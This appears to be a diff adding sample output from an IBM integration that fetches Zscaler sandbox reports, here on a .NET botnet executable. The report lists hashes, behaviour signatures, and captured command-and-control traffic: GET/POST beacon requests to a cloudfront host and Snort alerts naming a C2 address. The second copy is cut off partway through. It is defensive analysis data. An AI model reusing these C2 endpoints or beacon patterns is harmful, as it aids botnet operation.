@@ -1,0 +1,538 @@
+{
+    "content": {
+        "Full Details": {
+            "Summary": {
+                "Status": "COMPLETED",
+                "Category": "EXECS",
+                "FileType": "EXE",
+                "StartTime": 1620229320,
+                "Duration": 658451
+            },
+            "Classification": {
+                "Type": "MALICIOUS",
+                "Category": "MALWARE_BOTNET",
+                "Score": 80,
+                "DetectedMalware": "Gen:Variant.MSILPerseus.158871"
+            },
+            "FileProperties": {
+                "FileType": "EXE",
+                "FileSize": 22016,
+                "MD5": "542a09dbd513bf75e29572922ce0687e",
+                "SHA1": "6e0d16aa60b37596774ed0d3054ed2ff39d9378f",
+                "Sha256": "dbcb1fa12366b385224f1a203c8cc24d6740f4bfa3b4f7a9d6d9ff059f470819",
+                "Issuer": '',
+                "DigitalCerificate": '',
+                "SSDeep": "384:UGaRIorFBiFKx5v38y3QLp29Jub/mPkaVIKvtMNokpkjUo165Dt:1JorvjxZPAgyQRt/7jUo1A",
+                "RootCA": ''
+            },
+            "SystemSummary": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "Binary contains paths to debug symbols",
+                    "SignatureSources": [
+                        '',
+                        "14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp",
+                        "C:\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp",
+                        "X8c:\\Users\\Julien\\Documents\\Visual Studio 2013\\Projects\\Botnet\\Botnet\\obj\\Release\\Botnet.pdb source: 14351.exe",
+                        "c:\\Users\\Julien\\Documents\\Visual Studio 2013\\Projects\\Botnet\\Botnet\\obj\\Release\\Botnet.pdb source: 14351.exe",
+                        "pC:\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp",
+                        "t.pdb source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Classification label",
+                    "SignatureSources": [
+                        '',
+                        "mal52.winEXE@2/1@2/4"
+                    ]
+                }
+
+            ],
+            "Networking": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "Downloads files from web servers via HTTP",
+                    "SignatureSources": [
+                        '',
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net"
+                    ]
+                }
+            ],
+            "SecurityBypass": [
+                {
+                    "Risk": "MODERATE",
+                    "Signature": "Found a high number of Window / User specific system calls",
+                    "SignatureSources": [
+                        '',
+                        "foregroundWindowGot 1497",
+                        "foregroundWindowGot 494",
+                        "threadDelayed 1941",
+                        "threadDelayed 36971",
+                        "threadDelayed 4118",
+                        "threadDelayed 448978"
+                    ]
+                }
+            ],
+            "Exploit": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "May try to detect the Windows Explorer process",
+                    "SignatureSources": [
+                        '',
+                        "+Mouse><LMouse><LMouse>[Program Manager]",
+                        "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse><LMouse>[Program Manager]p",
+                        "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]",
+                        "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]p",
+                        "<LMouse>[Program Manager]",
+                        "Program Manager",
+                        "Program Managerp",
+                        "[Program Manager] "
+                    ]
+                }
+            ],
+            "Stealth": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "Disables application error messages",
+                    "SignatureSources": [
+                        '',
+                        "NOOPENFILEERRORBOX",
+                    ]
+                }
+            ]
+        }
+    },
+    "inputs": {
+        "zia_full_report": True,
+        "zia_md5": "542a09dbd513bf75e29572922ce0687e"
+    },
+    "metrics": {
+        "version": "1.0",
+        "package": "fn-zia",
+        "package_version": "1.0.0",
+        "host": "host.ibm.com",
+        "execution_time_ms": 22199,
+        "timestamp": "2021-05-11 10:33:14"
+    },
+    "raw": '{"Full Details": {"Summary": {"Status": "COMPLETED", "Category": "EXECS", "FileType": "EXE", "StartTime": 1620229320, "Duration": 658451}, "Classification": {"Type": "MALICIOUS", "Category": "MALWARE_BOTNET", "Score": 80, "DetectedMalware": "Gen:Variant.MSILPerseus.158871"}, "FileProperties": {"FileType": "EXE", "FileSize": 22016, "MD5": "542a09dbd513bf75e29572922ce0687e", "SHA1": "6e0d16aa60b37596774ed0d3054ed2ff39d9378f", "Sha256": "dbcb1fa12366b385224f1a203c8cc24d6740f4bfa3b4f7a9d6d9ff059f470819", "Issuer": "", "DigitalCerificate": "", "SSDeep": "384:UGaRIorFBiFKx5v38y3QLp29Jub/mPkaVIKvtMNokpkjUo165Dt:1JorvjxZPAgyQRt/7jUo1A", "RootCA": ""}, "SystemSummary": [{"Risk": "LOW", "Signature": "Binary contains paths to debug symbols", "SignatureSources": ["", "14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp", "C:\\\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp", "X8c:\\\\Users\\\\Julien\\\\Documents\\\\Visual Studio 2013\\\\Projects\\\\Botnet\\\\Botnet\\\\obj\\\\Release\\\\Botnet.pdb source: 14351.exe", "c:\\\\Users\\\\Julien\\\\Documents\\\\Visual Studio 2013\\\\Projects\\\\Botnet\\\\Botnet\\\\obj\\\\Release\\\\Botnet.pdb source: 14351.exe", "pC:\\\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp", "t.pdb source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp"]}, {"Risk": "LOW", "Signature": "Classification label", "SignatureSources": ["", "mal52.winEXE@2/1@2/4"]}, {"Risk": "LOW", "Signature": "Contains modern PE file flags such as dynamic base or NX", "SignatureSources": ["", "NO_SEH, TERMINAL_SERVER_AWARE, DYNAMIC_BASE, NX_COMPAT"]}, {"Risk": "LOW", "Signature": "Sample may offer command line options", "SignatureSources": ["", "delay time: 0", "delay time: 0", "delay time: 10", "delay time: 100", "delay time: 3600000", "delay time: 922337203685477"]}, {"Risk": "LOW", "Signature": "Creates guard pages", "SignatureSources": ["", "page read and write | page guard"]}, {"Risk": "LOW", "Signature": "Executable uses .NET runtime", "SignatureSources": ["", "C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\mscorlib\\\\5f07b97b8b64b1ad0f3033a0d991a7de\\\\mscorlib.ni.dll"]}, {"Risk": "LOW", "Signature": "PE file contains a COM descriptor data directory", "SignatureSources": ["", "data directory type: IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR"]}, {"Risk": "LOW", "Signature": "PE file contains a debug data directory", "SignatureSources": ["", "data directory type: IMAGE_DIRECTORY_ENTRY_DEBUG"]}, {"Risk": "LOW", "Signature": "PE file has an executable .text section and no other executable section", "SignatureSources": ["", "Section: .text IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_CNT_CODE, IMAGE_SCN_MEM_READ"]}, {"Risk": "LOW", "Signature": "Queries the volume information", "SignatureSources": ["", "C:\\\\14351.exe VolumeInformation"]}, {"Risk": "LOW", "Signature": "Reads software policies", "SignatureSources": ["", "HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\Safer\\\\CodeIdentifiers"]}, {"Risk": "LOW", "Signature": "Reads the hosts file", "SignatureSources": ["", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts", "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts"]}, {"Risk": "LOW", "Signature": "Sample monitors Window changes", "SignatureSources": [""]}, {"Risk": "LOW", "Signature": "Sample reads its own file content", "SignatureSources": ["", "C:\\\\14351.exe"]}, {"Risk": "LOW", "Signature": "Sample tries to load a library which is not present or installed on the analysis machine", "SignatureSources": [""]}, {"Risk": "LOW", "Signature": "Searches for user specific document files", "SignatureSources": ["", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents", "C:\\\\Users\\\\user\\\\Documents"]}, {"Risk": "LOW", "Signature": "Spawns processes", "SignatureSources": ["", "C:\\\\14351.exe \"C:\\\\14351.exe\" ", "C:\\\\Windows\\\\System32\\\\conhost.exe C:\\\\Windows\\\\system32\\\\conhost.exe 0x4"]}, {"Risk": "LOW", "Signature": "Tries to load missing DLLs", "SignatureSources": ["", "secruntime.dll", "secruntime.dll", "secruntime.dll", "secruntime.dll"]}, {"Risk": "LOW", "Signature": "Uses an in-process (OLE) Automation server", "SignatureSources": ["", "HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\\\InprocServer32"]}], "Networking": [{"Risk": "LOW", "Signature": "Downloads files from web servers via HTTP", "SignatureSources": ["", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net"]}, {"Risk": "LOW", "Signature": "Found strings which match to known social media URLs", "SignatureSources": ["", ".hotmail.com1&0 equals www.hotmail.com (Hotmail)", "hotmail.co.uk1 equals www.hotmail.com (Hotmail)", "hotmail.com1 equals www.hotmail.com (Hotmail)"]}, {"Risk": "LOW", "Signature": "Performs DNS lookups", "SignatureSources": ["", "queries for: wtfismyip.com"]}, {"Risk": "LOW", "Signature": "Posts data to web server", "SignatureSources": ["", "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdce79e7b7dHost: d1s"]}, {"Risk": "LOW", "Signature": "URLs found in memory or binary data", "SignatureSources": ["", "http://cacerts.digicert.com/digicertglobalcag2.crt0", "http://crl.globalsign.net/root-r2.crl0", "http://crl.securetrust.com/stca.crl0", "http://crl.usertrust.com/utn-userfirst-object.crl0)", "http://crl3.digicert.com/digicertglobalcag2.crl05", "http://crl3.digicert.com/digicertglobalrootca.crl0c", "http://crl3.digicert.com/digicertglobalrootg2.crl0=", "http://crl4.digicert.com/digicertglobalcag2.crl0"]}, {"Risk": "LOW", "Signature": "Uses HTTPS", "SignatureSources": ["", "HTTP traffic on port 443 -> 49701", "HTTP traffic on port 443 -> 49702", "HTTP traffic on port 443 -> 49703", "HTTP traffic on port 49701 -> 443", "HTTP traffic on port 49702 -> 443", "HTTP traffic on port 49703 -> 443"]}, {"Risk": "LOW", "Signature": "Uses a known web browser user agent for HTTP communication", "SignatureSources": ["", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net", "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdce79e7b7dHost: d1s", "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdcf8e0626fHost: d1s"]}, {"Risk": "MODERATE", "Signature": "Checks the public IP address of the machine", "SignatureSources": ["", "name: wtfismyip.com"]}, {"Risk": "MODERATE", "Signature": "Snort IDS Alert for network traffic", "SignatureSources": ["", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49705 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49706 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49710 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49711 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49712 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49716 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49717 -> 178.154.131.215:80", "Medium Alert: 2030834 ET TROJAN MSIL/Juliens Botnet CnC Activity M1 192.168.1.153:49718 -> 178.154.131.215:80"]}], "SecurityBypass": [{"Risk": "LOW", "Signature": "Checks for kernel debuggers", "SignatureSources": ["", "KernelDebuggerInformation"]}, {"Risk": "LOW", "Signature": "Contains long sleeps", "SignatureSources": ["", "delay time: 3600000", "delay time: 922337203685477"]}, {"Risk": "LOW", "Signature": "Executes massive amount of sleeps in a loop", "SignatureSources": ["", "-1790256512353510857s >= -60000s", "-3600000s >= -60000s", "80 > 30"]}, {"Risk": "MODERATE", "Signature": "Sample sleeps for a long time (installer files shows these property).", "SignatureSources": [""]}, {"Risk": "MODERATE", "Signature": "Found a high number of Window / User specific system calls", "SignatureSources": ["", "foregroundWindowGot 1497", "foregroundWindowGot 494", "threadDelayed 1941", "threadDelayed 36971", "threadDelayed 4118", "threadDelayed 448978"]}], "Exploit": [{"Risk": "LOW", "Signature": "May try to detect the Windows Explorer process", "SignatureSources": ["", "+Mouse><LMouse><LMouse>[Program Manager]", "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse><LMouse>[Program Manager]p", "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]", "<LMouse><RMouse><LMouse><RMouse><LMouse><LMouse>[Program Manager]p", "<LMouse>[Program Manager]", "Program Manager", "Program Managerp", "[Program Manager] "]}], "Stealth": [{"Risk": "LOW", "Signature": "Disables application error messages", "SignatureSources": ["", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX", "NOOPENFILEERRORBOX"]}]}}',
+    "version": "1.0",
+    "success": True,
+    "reason": None
+}
+
+{
+    "version": "1.0",
+    "success": True,
+    "reason": None,
+    "content": {
+        "Full Details": {
+            "Summary": {
+                "Status": "COMPLETED",
+                "Category": "EXECS",
+                "FileType": "EXE",
+                "StartTime": 1620229320,
+                "Duration": 658451
+            },
+            "Classification": {
+                "Type": "MALICIOUS",
+                "Category": "MALWARE_BOTNET",
+                "Score": 80,
+                "DetectedMalware": "Gen:Variant.MSILPerseus.158871"
+            },
+            "FileProperties": {
+                "FileType": "EXE",
+                "FileSize": 22016,
+                "MD5": "542a09dbd513bf75e29572922ce0687e",
+                "SHA1": "6e0d16aa60b37596774ed0d3054ed2ff39d9378f",
+                "Sha256": "dbcb1fa12366b385224f1a203c8cc24d6740f4bfa3b4f7a9d6d9ff059f470819",
+                "Issuer": '',
+                "DigitalCerificate": '',
+                "SSDeep": "384:UGaRIorFBiFKx5v38y3QLp29Jub/mPkaVIKvtMNokpkjUo165Dt:1JorvjxZPAgyQRt/7jUo1A",
+                "RootCA": ''
+            },
+            "SystemSummary": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "Binary contains paths to debug symbols",
+                    "SignatureSources": [
+                        '',
+                        "14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp",
+                        "C:\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp",
+                        "X8c:\\Users\\Julien\\Documents\\Visual Studio 2013\\Projects\\Botnet\\Botnet\\obj\\Release\\Botnet.pdb source: 14351.exe",
+                        "c:\\Users\\Julien\\Documents\\Visual Studio 2013\\Projects\\Botnet\\Botnet\\obj\\Release\\Botnet.pdb source: 14351.exe",
+                        "pC:\\14351.PDB source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp",
+                        "t.pdb source: 14351.exe, 00000000.00000002.1064908917.000000001CAC4000.00000004.00000001.sdmp"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Classification label",
+                    "SignatureSources": [
+                        '',
+                        "mal52.winEXE@2/1@2/4"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Contains modern PE file flags such as dynamic base or NX",
+                    "SignatureSources": [
+                        '',
+                        "NO_SEH, TERMINAL_SERVER_AWARE, DYNAMIC_BASE, NX_COMPAT"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Sample may offer command line options",
+                    "SignatureSources": [
+                        '',
+                        "delay time: 0",
+                        "delay time: 0",
+                        "delay time: 10",
+                        "delay time: 100",
+                        "delay time: 3600000",
+                        "delay time: 922337203685477"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Creates guard pages",
+                    "SignatureSources": [
+                        '',
+                        "page read and write | page guard"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Executable uses .NET runtime",
+                    "SignatureSources": [
+                        '',
+                        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\5f07b97b8b64b1ad0f3033a0d991a7de\\mscorlib.ni.dll"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "PE file contains a COM descriptor data directory",
+                    "SignatureSources": [
+                        '',
+                        "data directory type: IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "PE file contains a debug data directory",
+                    "SignatureSources": [
+                        '',
+                        "data directory type: IMAGE_DIRECTORY_ENTRY_DEBUG"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "PE file has an executable .text section and no other executable section",
+                    "SignatureSources": [
+                        '',
+                        "Section: .text IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_CNT_CODE, IMAGE_SCN_MEM_READ"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Queries the volume information",
+                    "SignatureSources": [
+                        '',
+                        "C:\\14351.exe VolumeInformation"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Reads software policies",
+                    "SignatureSources": [
+                        '',
+                        "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Safer\\CodeIdentifiers"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Reads the hosts file",
+                    "SignatureSources": [
+                        '',
+                        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+                        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+                        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+                        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+                        "C:\\Windows\\System32\\drivers\\etc\\hosts",
+                        "C:\\Windows\\System32\\drivers\\etc\\hosts"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Sample monitors Window changes",
+                    "SignatureSources": [
+                        ''
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Sample reads its own file content",
+                    "SignatureSources": [
+                        '',
+                        "C:\\14351.exe"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Sample tries to load a library which is not present or installed on the analysis machine",
+                    "SignatureSources": [
+                        ''
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Searches for user specific document files",
+                    "SignatureSources": [
+                        '',
+                        "C:\\Users\\user\\Documents",
+                        "C:\\Users\\user\\Documents",
+                        "C:\\Users\\user\\Documents",
+                        "C:\\Users\\user\\Documents",
+                        "C:\\Users\\user\\Documents",
+                        "C:\\Users\\user\\Documents"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Spawns processes",
+                    "SignatureSources": [
+                        '',
+                        "C:\\14351.exe 'C:\\14351.exe' ",
+                        "C:\\Windows\\System32\\conhost.exe C:\\Windows\\system32\\conhost.exe 0x4"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Tries to load missing DLLs",
+                    "SignatureSources": [
+                        '',
+                        "secruntime.dll",
+                        "secruntime.dll",
+                        "secruntime.dll",
+                        "secruntime.dll"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Uses an in-process (OLE) Automation server",
+                    "SignatureSources": [
+                        '',
+                        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\\InprocServer32"
+                    ]
+                }
+            ],
+            "Networking": [
+                {
+                    "Risk": "LOW",
+                    "Signature": "Downloads files from web servers via HTTP",
+                    "SignatureSources": [
+                        '',
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /Yabrod.pdf HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net",
+                        "GET /send.php?admin=34&id=123&nat=no&os=win&video=mpg&arch_type=x86&av_list=%5B%5D HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoHost: d1stb3hi9jgowm.cloudfront.net"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Found strings which match to known social media URLs",
+                    "SignatureSources": [
+                        '',
+                        ".hotmail.com1&0 equals www.hotmail.com (Hotmail)",
+                        "hotmail.co.uk1 equals www.hotmail.com (Hotmail)",
+                        "hotmail.com1 equals www.hotmail.com (Hotmail)"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Performs DNS lookups",
+                    "SignatureSources": [
+                        '',
+                        "queries for: wtfismyip.com"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Posts data to web server",
+                    "SignatureSources": [
+                        '',
+                        "POST /gpupd.php?VER=1.01 HTTP/1.1Authorization: Basic enNjYWxlcjp6c2NhbGVyUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like GeckoContent-Type: multipart/form-data; boundary=---------------------------8d90fdce79e7b7dHost: d1s"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "URLs found in memory or binary data",
+                    "SignatureSources": [
+                        '',
+                        "http://cacerts.digicert.com/digicertglobalcag2.crt0",
+                        "http://crl.globalsign.net/root-r2.crl0",
+                        "http://crl.securetrust.com/stca.crl0",
+                        "http://crl.usertrust.com/utn-userfirst-object.crl0)",
+                        "http://crl3.digicert.com/digicertglobalcag2.crl05",
+                        "http://crl3.digicert.com/digicertglobalrootca.crl0c",
+                        "http://crl3.digicert.com/digicertglobalrootg2.crl0=",
+                        "http://crl4.digicert.com/digicertglobalcag2.crl0"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Uses HTTPS",
+                    "SignatureSources": [
+                        '',
+                        "HTTP traffic on port 443 -> 49701",
+                        "HTTP traffic on port 443 -> 49702",
+                        "HTTP traffic on port 443 -> 49703",
+                        "HTTP traffic on port 49701 -> 443",
+                        "HTTP traffic on port 49702 -> 443",
+                        "HTTP traffic on port 49703 -> 443"
+                    ]
+                },
+                {
+                    "Risk": "LOW",
+                    "Signature": "Uses a known web browser user agent for HTTP communication",
+                    "SignatureSources": [
+                        '',
